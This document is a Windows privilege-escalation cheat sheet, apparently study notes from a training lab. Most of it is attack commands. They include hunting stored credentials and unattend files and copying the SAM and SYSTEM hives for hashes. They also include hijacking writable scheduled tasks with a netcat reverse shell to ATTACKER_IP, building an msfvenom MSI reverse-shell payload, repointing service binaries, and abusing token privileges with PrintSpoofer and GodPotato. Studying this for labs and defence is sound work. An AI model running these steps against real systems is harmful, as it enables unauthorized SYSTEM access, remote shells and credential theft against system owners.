# Windows PrivEsc 

## 1. Credential Hunting

**PowerShell history**

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Saved credentials**

```cmd
cmdkey /list
runas /savecred /user:DOMAIN\USER cmd.exe
```

`runas /savecred` is useful when credentials were previously saved for RunAs. `cmdkey /list` does not reveal saved passwords.

**Unattended installation files**

```text
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml
```

**IIS connection strings**

```cmd
findstr /i "connectionString" C:\inetpub\wwwroot\web.config
```

**PuTTY saved proxy settings**

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /f "Proxy" /s
```

## 2. Scheduled Task Hijacking

**Find the task action and execution account**

```cmd
schtasks /query /tn "TASK_NAME" /fo LIST /v
icacls "C:\Path\to\script.bat"
```

**Condition:** The task runs with elevated privileges, and its script or executable is writable by your account.

Example: replace a writable batch script with a reverse-shell command:

```cmd
echo C:\Tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\Tasks\job.bat
```

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Trigger the task if your account has permission:

```cmd
schtasks /run /tn "TASK_NAME"
```

**Gotchas:** The example requires a Netcat build supporting `-e`, the paths must match the real task, and the shell runs with the task's configured account.

## 3. AlwaysInstallElevated

Check **both** registry values:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Condition:** Both values must be `0x1`.

Generate an MSI payload on the attacker machine:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o payload.msi
```

Start a matching Metasploit handler:

```text
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

After transferring `payload.msi` to the target:

```cmd
msiexec /qn /i C:\Windows\Temp\payload.msi
```

**Gotchas:** The target must reach `ATTACKER_IP:4444`; transfer the MSI first. Match the payload architecture and handler settings.

## 4. Service Misconfigurations

### A. Unquoted Service Path

Inspect the service:

```cmd
sc.exe qc SERVICE_NAME
```

Example vulnerable path:

```text
C:\Program Files\My App\service.exe
```

Windows may check ambiguous executable paths such as:

```text
C:\Program.exe
C:\Program Files\My.exe
```

Check the relevant directories:

```cmd
icacls "C:\"
icacls "C:\Program Files"
```

**Exploit condition:** You can write a payload to an executable candidate that Windows checks before the intended service executable. An unquoted path alone is not enough.

### B. Writable Service Binary

```cmd
sc.exe qc SERVICE_NAME
icacls "C:\Path\to\service.exe"
```

**Condition:** The service runs with elevated privileges and you can modify its executable or another file it loads.

### C. Weak Service Permissions

```cmd
accesschk64.exe -qlc SERVICE_NAME
```

Look for permissions that let your account change the service configuration, such as `SERVICE_CHANGE_CONFIG`.

If you have the required permissions:

```cmd
sc.exe config SERVICE_NAME binPath= "C:\Temp\payload.exe"
sc.exe stop SERVICE_NAME
sc.exe start SERVICE_NAME
```

**Gotchas:**

- Confirm the service runs as `LocalSystem` before expecting SYSTEM.
    
- You need permission to change the configuration and restart the service.
    
- A normal executable may run its payload but fail the service startup handshake; a failed service status does not by itself prove the payload failed.
    
- Back up and restore the original configuration in a lab.
    

## 5. Dangerous Windows Privileges

Check the current token:

```cmd
whoami /priv
```

### `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`

These can enable token-impersonation privilege escalation, depending on the Windows build and available exploit conditions.

PrintSpoofer example:

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

GodPotato example:

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

A successful result should identify the execution context as `NT AUTHORITY\SYSTEM`. Tool compatibility and privilege state matter; the privilege alone does not guarantee success.

### `SeBackupPrivilege`

Backup-mode copying may let you access protected files:

```cmd
robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM
```

The privilege must be available in the current token, and the copy must succeed. The copied hives can then be analyzed offline for local account hashes.

### `SeTakeOwnershipPrivilege`

Take ownership of a file:

```cmd
takeown /f C:\Path\to\file
```

Ownership alone does not grant every file permission. You may also need to change the file's ACL before you can modify it.

## 6. Vulnerable Software

**List installed products**

```cmd
wmic product get name,version,vendor
```

WMIC can be slow and may miss installed applications. Also inspect:

```text
C:\Program Files
C:\Program Files (x86)
```

Research the exact product version and its CVEs or known local exploits.

**Example from the room:** Druva inSync 6.6.3 had a vulnerable local RPC service on port `6064` that could allow SYSTEM-level command execution. Verify the exact version and exploit conditions before testing.

## 7. Enumeration & Exploit Research

**WinPEAS**

```cmd
winpeas.exe > output.txt
```

**PrivescCheck (PowerShell)**

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

**WES-NG**

On the target:

```cmd
systeminfo > systeminfo.txt
```

Transfer the file to the attacker machine, then run:

```bash
python3 wes.py --update
python3 wes.py systeminfo.txt
```

**Metasploit local exploit suggestions**

```text
use post/multi/recon/local_exploit_suggester
show options
set SESSION SESSION_ID
run
```

Treat tool output as leads to investigate, not proof that an exploit will work.

## Core Workflow

**Hunt credentials → Check scheduled tasks → Inspect service paths and permissions → Check dangerous privileges → Research vulnerable software and missing patches → Verify the escalation path.**
